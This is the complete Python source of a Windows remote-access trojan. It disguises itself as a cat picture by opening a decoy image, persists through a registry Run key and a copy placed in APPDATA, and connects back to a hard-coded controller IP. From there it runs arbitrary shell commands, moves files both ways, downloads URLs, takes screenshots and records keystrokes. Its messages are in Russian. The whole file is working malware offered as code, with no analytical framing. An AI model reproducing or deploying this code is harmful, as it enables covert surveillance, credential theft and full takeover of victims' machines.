#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import winreg
import base64
import requests
from mss import mss
import threading
from keylogger import KeyLogger


def reliable_send(data, sock, binary=False):
    try:
        if binary:
            sock.sendall(data)  
        else:
            json_data = json.dumps(data).encode()
            sock.send(json_data)
    except Exception:
        pass


def reliable_recv(sock, binary=False):
    json_data = b""
    while True:
        try:
            chunk = sock.recv(1024)
            if binary:
                return chunk  
            json_data += chunk
            return json.loads(json_data.decode())
        except ValueError:
            continue


def open_image():
    try:
        if hasattr(sys, "_MEIPASS"):
            image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
        else:
            image_path = os.path.join(os.getcwd(), "cutecat.jpg")
        if os.path.exists(image_path):
            subprocess.Popen(["start", image_path], shell=True)
    except Exception:
        pass


def setup_autorun():
    try:
        location = os.environ["APPDATA"] + "\\cutecat.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)

        reg_path = f'"{location}"'

        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(key, "cutecat", 0, winreg.REG_SZ, reg_path)

    except Exception:
        pass


def is_admin(sock):
    try:
        temp_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "temp")
        os.listdir(temp_dir)
        admin = "[!!] Administrator Privileges"
    except PermissionError:
        admin = "[!!] User Privileges"
    except Exception as e:
        admin = f"[!!] Ошибка при проверке привилегий: {e}"
    reliable_send(admin, sock)


def download(url, sock):
    try:
        get_response = requests.get(url, timeout=10)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)
        reliable_send(f"[+] Файл {file_name} успешно скачан!", sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка скачивания файла: {e}", sock)


def screenshot(sock):
    try:
        with mss() as sct:
            screenshot_file = sct.shot(output="screenshot.png")
        with open(screenshot_file, "rb") as screen_file:
            data = base64.b64encode(screen_file.read()).decode()
            reliable_send(data, sock)
    finally:
        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")


def upload(sock, file_name):
    try:
        with open(file_name, "rb") as file:
            while True:
                chunk = file.read(1024)  
                if not chunk:  
                    break
                sock.sendall(chunk)  
        sock.sendall(b"EOF")  
    except FileNotFoundError:
        reliable_send("[!!] Файл не найден", sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка: {e}", sock)



def save_file(sock, file_name):
    try:
        with open(file_name, "wb") as file:
            file_data = reliable_recv(sock)
            file.write(base64.b64decode(file_data))
        reliable_send("[+] Файл успешно загружен", sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)


def execute_command(sock, command):
    try:
        proc = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        reliable_send(result.decode(errors="ignore"), sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)


def send_keylog_file(sock, keylogger):
    try:
        keylogger_path = keylogger.get_path()
        if not os.path.exists(keylogger_path):
            reliable_send("[!!] Файл кейлогера отсутствует", sock)
            return

        with open(keylogger_path, "r", encoding="utf-8") as file:
            logs = file.read().strip()
            if logs:
                reliable_send(logs, sock)
                with open(keylogger_path, "w", encoding="utf-8") as file:
                    file.write("")
            else:
                reliable_send("[!!] Кейлог пуст", sock)
    except Exception as e:
        reliable_send(f"[!!] Ошибка при отправке кейлогов: {e}", sock)


def shell(sock):
    keylogger = KeyLogger()
    while True:
        try:
            command = reliable_recv(sock)
            if command == "q":
                keylogger.stop()
                sock.close()
                sys.exit(0)
            elif command.startswith("cd"):
                try:
                    os.chdir(command[3:])
                    reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
                except Exception as e:
                    reliable_send(f"[!!] Ошибка: {e}", sock)
            elif command.startswith("download"):
                upload(sock, command[9:])
            elif command.startswith("upload"):
                save_file(sock, command[7:])
            elif command.startswith("get"):
                download(command[4:], sock)
            elif command.startswith("start"):
                try:
                    subprocess.Popen(command[6:], shell=True)
                    reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
                except Exception as e:
                    reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
            elif command.startswith("screenshot"):
                screenshot(sock)
            elif command.startswith("check"):
                is_admin(sock)
            elif command.startswith("keylog_start"):
                if not keylogger.running:
                    t1 = threading.Thread(target=keylogger.start, daemon=True)
                    t1.start()
                    reliable_send("[+] Кейлоггер запущен", sock)
                else:
                    reliable_send("[!!] Кейлоггер уже запущен", sock)
            elif command.startswith("keylog_dump"):
                send_keylog_file(sock, keylogger)
            else:
                execute_command(sock, command)
        except Exception as e:
            reliable_send(f"[!!] Ошибка запуска {e}", sock)
            break


def connection():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.178.67", 54321))
            shell(sock)
        except Exception:
            time.sleep(5)


if __name__ == "__main__":
    setup_autorun()
    open_image()
    connection()
